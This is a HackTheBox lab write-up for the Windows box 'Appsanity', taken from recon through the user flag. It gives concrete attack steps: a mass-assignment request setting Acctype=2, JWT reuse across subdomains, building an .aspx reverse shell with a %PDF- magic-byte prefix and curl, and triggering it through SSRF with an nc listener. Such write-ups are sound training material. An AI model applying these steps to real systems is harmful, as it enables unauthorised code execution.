---
title: "Appsanity"
date: 2026-10-16 07:00:00 -0500
categories: [HackTheBox, Windows]
tags: [hackthebox, windows, hard, mass-assignment, jwt, file-upload, magic-bytes, ssrf, iis, aspx]
description: "Appsanity is a Hard Windows box built around web application misconfigurations. A hidden Acctype field on the signup form lets you self-assign a privileged Doctor role, the issued JWT is honoured on a sister subdomain, and that portal's PDF-only upload filter is defeated by prepending the %PDF- magic bytes to an .aspx web shell. A server-side request forgery then reaches an internal viewer that triggers the shell — landing code execution as the IIS app-pool user. This post covers recon through the user flag."
---

## Overview

Appsanity is a Hard Windows machine focused entirely on web-application logic flaws. The path to user chains four issues: a mass-assignment privilege escalation at signup, a JWT that is trusted across two subdomains, a magic-byte file-upload bypass, and an SSRF that triggers the uploaded shell. Foothold lands as the IIS application-pool account `svc_exampanel`, which owns `user.txt`.

## Recon

```bash
nmap -p- --min-rate=1000 -T4 10.129.10.246
nmap -p80,443,5985 -sC -sV 10.129.10.246
```

| Port | Service | Notes |
|------|---------|-------|
| 80   | IIS 10.0 (HTTP) | redirects to `https://meddigi.htb/` |
| 443  | IIS 10.0 (HTTPS) | `meddigi.htb` web app |
| 5985 | WinRM | needs valid creds |

Both 80 and 443 redirect to `meddigi.htb`, so map it in `/etc/hosts` and browse the HTTPS site.

```bash
echo "10.129.10.246 meddigi.htb" | sudo tee -a /etc/hosts
```

## Enumeration

The front page is mostly static with a "Sign In" / sign-up flow. Register an account and log in to reach `/Profile`. Nothing obvious injects, so the interesting behaviour is in the requests themselves.

A subdomain fuzz turns up a second host:

```bash
wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
  --ip 10.129.10.246:443 --hc 302 https://FUZZ.meddigi.htb
# -> portal.meddigi.htb
```

```bash
echo "10.129.10.246 portal.meddigi.htb" | sudo tee -a /etc/hosts
```

`portal.meddigi.htb` is a doctors-only login that our account can't access yet.

## Foothold

**1 — Mass assignment: become a Doctor.** The signup POST carries a hidden field, `Acctype`, defaulted to `1` (Patient). Intercept the request in Burp and change it:

```http
POST /Signup/SignUp HTTP/2
Host: meddigi.htb
...
Name=x&LastName=y&Email=x@htb.htb&Password=<pass>&ConfirmPassword=<pass>&...&Acctype=2
```

`Acctype=2` creates the account as a **Doctor**. Logging in shows the Doctor profile and a new supervisor form.

**2 — Reuse the JWT across the subdomain.** Authenticated sessions use a JWT `access_token`. The token issued by `meddigi.htb` is also trusted by `portal.meddigi.htb`. In the browser dev-tools, add an `access_token` cookie on `portal.meddigi.htb` set to the Doctor JWT, refresh, and the portal dashboard loads.

**3 — Magic-byte upload bypass.** The portal's "Upload Report" form only accepts PDFs and checks the leading magic bytes. The extension is not validated, so prepend `%PDF-` to an `.aspx` reverse shell:

```bash
printf '%PDF-' > shell.aspx
curl -s https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx >> shell.aspx
# set the callback host/port inside shell.aspx, then upload it on "Upload Report"
```

The file is accepted, but there's no direct way to view it.

**4 — SSRF triggers the shell.** The `/Prescriptions` page previews any URL you submit, server-side, with no allow-list. Fuzz `127.0.0.1:PORT` to find an internal-only viewer (it lives on `127.0.0.1:8080`), then use the SSRF to request the uploaded report's link — which executes the `.aspx`.

```bash
nc -lvnp 4444
# submit http://127.0.0.1:8080/<view-report-link> through the /Prescriptions preview
```

The shell returns as the IIS application-pool user:

```text
appsanity\svc_exampanel
```

## User flag

```bash
type C:\Users\svc_exampanel\Desktop\user.txt   # HTB{...}
```

Access as `svc_exampanel` achieved.

> Foothold complete. Privilege escalation is left as an exercise — this post stops at user.
